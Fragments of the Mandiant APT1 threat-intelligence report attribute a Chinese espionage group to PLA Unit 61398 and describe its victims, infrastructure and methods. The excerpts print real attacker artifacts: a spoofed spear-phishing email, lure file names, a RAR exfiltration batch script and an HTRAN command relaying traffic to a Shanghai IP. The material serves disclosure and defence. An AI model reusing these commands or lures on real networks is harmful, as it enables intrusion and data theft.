              "text_verbatim": "# EXECUTIVE SUMMARY Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent Threat” (APT). We first published details about the APT in our January 2010 M-Trends report. As we stated in the report, our position was that “The Chinese government may authorize this activity, but there’s no way to determine the extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them.³ Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most prolific of these groups. We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this report. The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted. Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others. Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China’s cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign in large part because it receives direct government support. In seeking to identify the organization behind this activity, our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate. ³ Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations. None of the information in this report involves access to or confirmation by classified intelligence. Mandiant APT1 www.mandiant.com",

              "text_verbatim": "# KEY FINDINGS APT1 is believed to be the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department (总参三部二局), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398部队). - The nature of “Unit 61398's” work is considered by China to be a state secret; however, we believe it engages in harmful “Computer Network Operations.” - Unit 61398 is partially situated on Datong Road (大同路) in Gaoqiaozhen (高桥镇), which is located in the Pudong New Area (浦东新区) of Shanghai (上海). The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007. - We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 61398's physical infrastructure. - China Telecom provided special fiber optic communications infrastructure for the unit in the name of national defense. - Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be proficient in the English language. - Mandiant has traced APT1's activity to four large networks in Shanghai, two of which serve the Pudong New Area where Unit 61398 is based. APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously.⁴ - Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries. - APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable intellectual property. - Once APT1 has established access, they periodically revisit the victim's network over several months or years and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists from victim organizations' leadership. - APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email — GETMAIL and MAPIGET. - APT1 maintained access to victim networks for an average of 356 days.⁵ The longest time period APT1 maintained access to a victim's network was 1,764 days, or four years and ten months. - Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten-month time period. - In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different industries. ⁴ We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report. ⁵ This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 www.mandiant.com APT1 focuses on compromising organizations across a broad range of industries in English-speaking countries. - Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language",

APT1 maintains an extensive infrastructure of computer systems around the world. - APT1 controls thousands of systems in support of their computer intrusion activities. - In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were registered to organizations in China (709), followed by the U.S. (109). - In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique IP addresses. - Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user with an interactive graphical interface to a system. - In the last several years we have confirmed 2,551 FQDNs attributed to APT1. In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simplified Chinese language. - In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 operator's keyboard layout setting was “Chinese (Simplified) — US Keyboard”. Microsoft’s Remote Desktop client configures this setting automatically based on the selected language on the client system. Therefore, the APT1 attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts. - 817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China. - We observed 767 separate instances in which APT1 intruders used the “HUC Packet Transmit Tool” or HTRAN to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack infrastructure. Of the 614 distinct IP addresses used for HTRAN communications: - 614 of 614 (100%) were registered in China. - 613 (99.8%) were registered to one of four Shanghai net blocks. Mandiant APT1 www.mandiant.com Mandiant APT1 www.mandiant.com The size of APT1's infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators. - We conservatively estimate that APT1's current attack infrastructure includes over 1,000 servers. - Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly supported by linguists, open source researchers, malware authors, industry experts who translate task requests from requestors to the operators, and people who then transmit stolen information to the requestors. - APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who handle finances, facility management, and logistics (e.g., shipping). In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with APT1 activity. - The first persona, \"UglyGorilla\", has been active in computer network operations since October 2004",

We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely possibility: A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398's gates, performing tasks similar to Unit 61398's known mission.",

              "text_verbatim": "# Why We Are Exposing APT1 The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as a \"what if\" discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches. At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, publishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398's operations and impede their progress in a meaningful way. We are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of criticism. Mandiant APT1 www.mandiant.com",

The CPC is the ultimate authority in Mainland China; unlike in Western societies, in which political parties are subordinate to the government, the military and government in China are subordinate to the CPC. In fact, the PLA reports directly to the CPC's Central Military Commission (CMC, 中央军事委员会). This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC. We believe that the PLA's strategic cyber command is situated in the PLA's General Staff Department (GSD,总参谋部), specifically its 3rd Department (总参三部). The GSD is the most senior PLA department. Similar to the U.S. Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA.

This bureau already placed fiber-optic cable at the East Gate front entrance [road pole]. They need to use two ports to enter our company's East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company's Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military fiber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division's negotiation with the 3rd Department 2nd Bureau's communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas' channels, our company has a relatively abundant inventory to satisfy the military's request. This is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military's suggested price. Because this is a one-time payment, and it is difficult to use the normal renting method, we suggest our company accept one-time payment using the reason of \"Military Co-Construction [with China Telecom] of Communication Channels\" and provide from our inventory. The military's co-building does not interfere with our proprietary rights",

Remarkably, we have witnessed APT1 target dozens of organizations simultaneously. Once the group establishes access to a victim's network, they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, emails and contact lists from victim organizations' leadership.

Figure 10 shows the timeline of the 141 compromises we are aware of; each marker in the figure represents a separate victim and indicates the earliest confirmed date of APT1 activity in that organization's network.²⁶ With the ephemeral nature of electronic evidence, many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1's presence in the network. ²⁶ Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each year, which may reflect an increase in APT1's activity. However, this increase may also simply reflect Mandiant's expanding visibility into APT1's activities as the company has grown and victims' awareness of cyber espionage activity in their networks has improved. Longest time period within which APT1 has continued to access a victim's network: 4 Years, 10 Months Once APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in Figure 10, we found that APT1 maintained access to the victim's network for an average of 356 days.²⁷ The longest time period APT1 maintained access to a victim's network was at least 1,764 days, or four years and ten months.

              "text_verbatim": "## APT1’s Geographic &amp; Industry Focus The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English-language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities. ²⁷ This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 www.mandiant.com APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1's mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our findings suggest. Further, the scope of APT1's parallel activities implies that the group has significant personnel and technical resources at its disposal. In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim's network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims. Mandiant APT1 www.mandiant.com TIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR Mandiant APT1 www.mandiant.com We believe that organizations in all industries related to China's strategic priorities are potential targets of APT1's comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more heavily than others (see Figure 13), our observations confirm that APT1 has targeted at least four of the seven strategic emerging industries that China identified in its 12th Five Year Plan.²⁸ Mandiant APT1 www.mandiant.com",

              "text_verbatim": "# APT1 Data Theft APT1 steals a broad range of information from its victims. The types of information the group has stolen relate to: - product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies; - manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes; - business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions; - policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-ranking personnel; - emails of high-ranking employees; and - user credentials and network architecture information. It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons: - APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities. - Pre-existing network security monitoring rarely records or identifies the data theft. - The duration of time between the data theft and Mandiant's investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business. - Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach. Even with these challenges, we have observed APT1 steals as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1's operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims. &gt; Largest APT1 data theft from a single organization: &gt; 6.5 Terabytes &gt; over 10 months Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed file archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group's efforts were not finding their way into the hands of entities able to capitalize on them.

However, several factors complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them. To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we have confirmed as referring to APT1. - The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of Symantec.³⁰ The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as Ugly Gorilla (discussed later in this report). - In September 2012, Brian Krebs of the “Krebs on Security” cybercrime blog reported on a security breach at Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure that the hackers used to exploit and gain access to the system.³¹ - A SCADA security company by the name of Digital Bond published a report of spear phishing against its company in June 2012.³² AlienVault provided analysis on the associated malware.³³ Indicators included in the report have been attributed as part of APT1 infrastructure. - In November 2012, Bloomberg’s Chloe Whiteaker authored a piece on a Chinese threat group called “Comment Group,” which described the various tools and domains used by APT1 persona Ugly Gorilla.³⁴ Mandiant APT1 www.mandiant.com",

They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting compressed bundles of files to China – before beginning the cycle again. They employ good English — with acceptable slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years, resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships. These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant's Attack Lifecycle model. In each stage we will discuss APT1's specific techniques to illustrate their tenacity and the scale at which they operate.

As with most other APT groups, spear phishing is APT1's most commonly used technique. The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are usually relevant to the recipient. APT1 also creates webmail accounts using real peoples' names — names that are familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel — and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant employees: ```txt Date: Wed, 18 Apr 2012 06:31:41 -0700 From: Kevin Mandia <kevin.mandia@rocketmail.com> Subject: Internal Discussion on the Press Release Hello, Shall we schedule a time to meet next week?

However, further scrutiny shows that the email was not sent from a Mandiant email account, but from \"kevin.mandia@rocketmail.com\". Rocketmail is a free webmail service. The account \"kevin.mandia@rocketmail.com\" does not belong to Mr. Mandia. Rather, an APT1 actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named \"Internal_Discussion_Press_Release_In_Next_Week8.zip\". This file contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE. Mandiant APT1 www.mandiant.com</kevin.mandia@rocketmail.com> Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the predominant trend we have observed in the last several years. Below is a sampling of file names that APT1 has used with their malicious ZIP files: ```txt 2012ChinaUSAviationSymposium.zip Employee-Benefit-and-Overhead-Adjustment-Keys.zip MARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip Negative_Reports_Of_Turkey.zip New_Technology_For_FPGA_And_Its_Developing_Trend.zip North_Korean_launch.zip Oil-Field-Services-Analysis-And-Outlook.zip POWER_GEN_2012.zip Proactive_Investors_One2One_Energy_Investor_Forum.zip Social-Security-Reform.zip South_China_Sea_Security_Assessment_Report.zip Telephonics_Supplier_Manual_v3.zip The_Latest_Syria_Security_Assessment_Report.zip Updated_Office_Contact_v1.zip Updated_Office_Contact_v2.zip Welfare_Reform_and_Benefits_Development_Plan.zip ``` The example file names include military, economic, and diplomatic themes, suggesting the wide range of industries that APT1 targets. Some names are also generic (e.g., \"updated_office_contact_v1.zip\") and could be used for targets in any industry. On some occasions, unsuspecting email recipients have replied to the spear phishing messages, believing they were communicating with their acquaintances",

Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look like benign Adobe PDF files. Here is an example: Name Type employee benefit and overhead adjustment keys.pdf ... Application This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes 119 spaces after \".pdf\" followed by \".exe\" — the real file extension. APT1 even went to the trouble of turning the executable's icon to an Adobe symbol to complete the ruse. However, this file is actually a dropper for a custom APT1 backdoor that we call WEBC2-QBP. Establishing A Foothold Establishing a foothold involves actions that ensure control of the target network's systems from outside the network. APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT backdoors initiate outbound connections to the intruder's \"command and control\" (C2) server. APT intruders employ this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating communication with systems inside the network, they are less reliable at keeping malware that is already inside the network from communicating to systems outside. While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of backdoors in \"Appendix C: The Malware Arsenal\" that APT1 uses that we believe are not publicly available. In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1's backdoors in two categories: \"Beachhead Backdoors\" and \"Standard Backdoors.\" Mandiant APT1 www.mandiant.com Mandiant APT1 31 www.mandiant.com",

APT1's beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the reason why some security companies refer to APT1 as the \"Comment Crew.\" A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can confirm that APT1 was using WEBC2 backdoors as early as July 2006. However, the first compile time³⁵ we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years. For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:",

However, one can expect that an iPad 1 and an iPad 2 share a significant number of components — much more than, say, an iPad 1 and a Microsoft Surface. Thus it makes sense to refer to the iPad \"family\" and the Surface \"family\". When it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.",

The compile date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it. A \"build path\" discloses the directory from which the programmer built and compiled his source code. These samples, compiled 2.5 years apart, were compiled within a folder named \"work\\code\\...\\ mywork\". The instances of \"work\" suggest that working on WEBC2 is someone's day job and not a side project or hobby. Furthermore, the Sample A build string includes \"2012-2-23\" — which matches Sample A's compile date. The Sample B build string lacks \"2012-2-23\" but includes \"2009-8-7\" — which also matches Sample B's compile date. This suggests that the code used to compile Sample A was modified from code that was used to compile Sample B 2.5 years previously. The existence of \"2008-7-8\" suggests that the code for both samples was modified from a version that existed in July 2008, a year before Sample B was created. This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long-term process. WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems, including: - Open an interactive command shell (usually Windows' cmd.exe) - Download and execute a file - Sleep (i.e. remain inactive) for a specified amount of time WEBC2 backdoors are often packaged with spear phishing emails. Once installed, APT1 intruders have the option to tell victim systems to download and execute additional malicious software of their choice.

Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person's password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person's password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in. It is supposed to be impossible to \"reverse\" a hash to obtain the original password. However, it is possible with enough computational resources to \"crack\" password hashes to discover the original password. (\"Cracking\" generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by \"passing-the-hash\") or crack them to discover users' passwords.",

We have observed APT1 using stolen usernames and passwords to log into victim networks' VPNs when the VPNs are only protected by single-factor authentication. From there they are able to access whatever the impersonated users are allowed to access within the network. ³⁶ Mandiant uses the term “credentials” to refer to a userid and its corresponding, working password. Mandiant APT1 www.mandiant.com 3. Log in to web portals Once armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This includes not only restricted websites, but also web-based email systems such as Outlook Web Access. Completing The Mission Similar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 19. (The instances of \"XXXXXX\" obfuscate the text that was in the actual batch script.) ```shell @echo off cd /d c:\\windows\\tasks rar.log a XXXXXXXX.rar -v200m \"C:\\Documents and Settings\\Place\\My Documents\\XXXXXX\" -hpsmy123!@# del *.vbs del %0 ``` After creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above shows a RAR command with the option \"-v200m\", which means that the RAR file should be split up into 200MB portions. Mandiant APT1 www.mandiant.com Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft Outlook archive (\"PST\") files. Microsoft Outlook archives can be large, often storing years' worth of emails. They may be too large to transfer out of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows APT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week's emails. Whereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email from specified accounts into text files (for the email body) and separate attachments, if there are any.",

              "text_verbatim": "# APT1 Network Origins We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or \"hop\" through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country they choose. The systems in this type of network redirection infrastructure have come to be called \"hop points\" or \"hops.\" Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as camouflage for their attacks without the knowledge of the systems' owners. These systems belong to third-party victims who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data and intellectual property. Mandiant APT1 www.mandiant.com We have observed some of APT1's activities after they cross into (virtual) U.S. territory. They access hop points using a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to a system. The experience is similar to the user actually physically sitting at the system and having direct access to the desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1's home networks. Notably, the registration information for the second and third net blocks above includes this contact information at the end: person: yanling ruan nic-hdl: YR194-AP e-mail: sh-ipmaster@chinaunicom.cn address: No.900, Pudong Avenue, ShangHai, China phone: +086-021-61201616 fax-no: +086-021-61201616 country: cn The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where PLA Unit 61398 is headquartered. The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea (1). We have confirmed that some of these systems are part of APT1's hop infrastructure and not legitimately owned by APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from Shanghai. In order to make a user's experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was \"Chinese (Simplified) — US Keyboard.\" Microsoft's Remote Desktop client configures this setting automatically based on the selected language on the client system, making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. \"Simplified Chinese\" is a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland China",

This interface sometimes runs on their personal attack system, which is typically in Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be forwarded from the hop to the intruder’s Shanghai system so the backdoor can talk to the C2 server software. We have observed 767 separate instances in which APT1 intruders used the publicly available “HUC Packet Transmit Tool” or HTRAN on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small fraction of APT1’s total activity. The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using the hop point. Mandiant APT1 www.mandiant.com Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443: ```txt htran -tran 443 58.247.242.254 443 ``` In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses.

For example, \"hugesoft.org\" is an FQDN but also represents a zone. The FQDNs \"ug-co.hugesoft.org\" and \"7cback.hugesoft.org\" are part of the \"hugesoft.org\" zone and are called \"subdomains\" of the zone. The person who registered \"hugesoft.org\" may add as many subdomains as they wish and controls the IP resolutions of these FQDNs. APT1 has registered at least 107 zones since 2004. Within these zones, we know of thousands of FQDNs that have resolved to hundreds of IP addresses (which we suspect are hops) and in some instances to APT1's source IP addresses in Shanghai. The first zone we became aware of was \"hugesoft.org\", which was registered through eNom, Inc. in October 2004. The registrant supplied \"uglygorilla@163.com\" as an email address. The supplied registration information, which is still visible in public \"whois\" data as of February 3, 2013, includes the following: Mandiant APT1 www.mandiant.com Domain Name:HUGESOFT.ORG Created On:25-Oct-2004 09:46:18 UTC Registrant Name:huge soft Registrant Organization:hugesoft Registrant Street1:shanghai Registrant City:shanghai Registrant State/Province:S Registrant Postal Code:200001 Registrant Country:CN Registrant Phone:+86.21000021 Registrant Email:uglygorilla@163.com The supplied registrant information does not need to be accurate for the zone to be registered successfully. For example, \"shanghai\" is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the first known APT1 domain registration, along with a phone number that begins with China's \"+86\" international code. In fact, Shanghai was listed as the registrant's city in at least 24 of the 107 (22%) registrations. Compare this to the frequency with which other cities appeared in APT1 zone registration information: Mandiant APT1 www.mandiant.com Some of the supplied registration information is obviously false. For example, consider the registration information supplied for the zone \"uszzcs.com\" in 2005: Victor etejedaa@yahoo.com +86.8005439436 Michael Murphy 795 Livermore St. Yellow Spring, Ohio, UNITED STATES 45387 Here, a phone number with a Chinese prefix (\"+86\") accompanied an address in the United States. Since the United States uses the prefix \"+\" it is highly unlikely that a person living in Ohio would provide a phone number beginning with \"+86\". Additionally, the city name is spelled incorrectly, as it should be \"Yellow Springs\" instead of \"Yellow Spring\". This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name incorrectly multiple times, both for the zones \"uszzcs.com\" and \"attnpower.com\". This suggests that the registrant really thought \"Yellow Spring\" was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, Ohio. Overall, the combination of a relatively high number of \"Shanghai\" registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present, in which some registrants tried to fabricate non-Shanghai locations but others did not",

